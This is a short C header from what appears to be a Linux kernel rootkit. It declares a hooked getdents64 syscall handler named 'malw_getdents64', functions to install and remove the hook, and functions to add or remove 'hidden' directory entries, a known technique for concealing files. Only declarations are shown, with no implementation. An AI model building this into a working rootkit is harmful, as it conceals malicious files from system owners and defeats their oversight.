#ifndef GETDENTS_H
#define GETDENTS_H

#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>

asmlinkage int malw_getdents64(const struct pt_regs *);
void install_getdents_hook(void);
void remove_getdents_hook(void);
void add_hidden_dent(char *);
void remove_hidden_dent(char *);

#endif
